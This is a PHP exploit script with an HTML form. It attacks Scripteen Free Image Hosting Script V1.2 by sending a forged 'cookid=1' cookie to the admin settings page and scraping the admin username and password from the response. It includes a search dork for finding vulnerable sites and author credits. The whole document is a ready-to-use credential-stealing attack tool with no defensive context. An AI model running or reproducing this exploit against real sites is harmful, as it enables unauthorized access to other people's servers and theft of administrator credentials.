&lt;?php
/*
Coded By RMx - Liz0zim
BiyoSecurity.Com &amp; Coderx.org
Ki zava Ki Zava :)
Thanx : Crackers_Child - TR_IP - Volqan - All SQL Low3rz
*/
error_reporting(&quot;E_ALL&quot;);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,5);
$desen=&#039;|value=&quot;(.*)&quot;|siU&#039;;

function yolla($host,$paket)
{
global $veri;
$ac=fsockopen(gethostbyname($host),80);
if (!$ac) {
echo &#039;Unable to connect to server &#039;.$host.&#039;:80&#039;; exit;//Ba.lanamaz ise
}
fputs($ac,$paket);
$veri=&quot;&quot;;
    while (!feof($ac)) {
      $veri.=fread($ac,1);
 
  }
  fclose($ac);
}
?&gt;
&lt;h2&gt;Scripteen Free Image Hosting Script V1.2.* (cookie) Admin Password Grabber Exploit&lt;/h2&gt;
&lt;p&gt;Coded By RMx - Liz0ziM&lt;/p&gt;
&lt;p&gt;Web:&lt;a href=&quot;http://www.biyosecurity.com&quot; target=&quot;_blank&quot;&gt;www.biyosecurity.com&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;Dork:&quot;Powered by Scripteen Free Image Hosting Script V1.2&quot;&lt;/p&gt;
&lt;form method=&quot;POST&quot; action=&quot;&quot;&gt;
&lt;p&gt;TARGET HOST:
  &lt;input name=&quot;host&quot; type=&quot;text&quot; /&gt;
  Example:&lt;strong&gt;www.xxxx.com&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;TARGET PATH:   &lt;input name=&quot;klasor&quot; type=&quot;text&quot; /&gt;
Example:&lt;strong&gt;/&lt;/strong&gt; or &lt;strong&gt;/scriptpath/&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;&lt;input name=&quot;yolla&quot; type=&quot;submit&quot; value=&quot;Send&quot; /&gt;&lt;/p&gt;
&lt;/form&gt;&lt;br /&gt;
&lt;? if($_POST[yolla]){
$host=$_POST[host];
$klasor=$_POST[klasor];
$admin=$_POST[admin];
$p=$klasor.&quot;admin/settings.php&quot;;
echo &#039;&lt;font color=&quot;red&quot;&gt;&lt;b&gt;Sending Exploit..&lt;/b&gt;&lt;/font&gt;&lt;br&gt;&#039;;
$packet =&quot;GET &quot;.$p.&quot; HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Cookie: cookid=1\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
yolla($host,$packet);
preg_match_all($desen,$veri,$cik);
$ad=$cik[1][0];
$sifre=$cik[1][1];
if($ad AND $sifre){
echo &#039;
&lt;font color=&quot;green&quot;&gt;Exploit succeeded...&lt;/font &gt;&lt;br&gt;
Admin Username:&lt;b&gt;&#039;.$ad.&#039;&lt;/b&gt;&lt;br&gt;
Admin Password:&lt;b&gt;&#039;.$sifre.&#039;&lt;/b&gt;&lt;br&gt;&#039;;
}
else
{
echo &#039;&lt;font color=&quot;red&quot;&gt;Exploit Failed !&lt;/font&gt;&#039;;
}
}

?&gt;

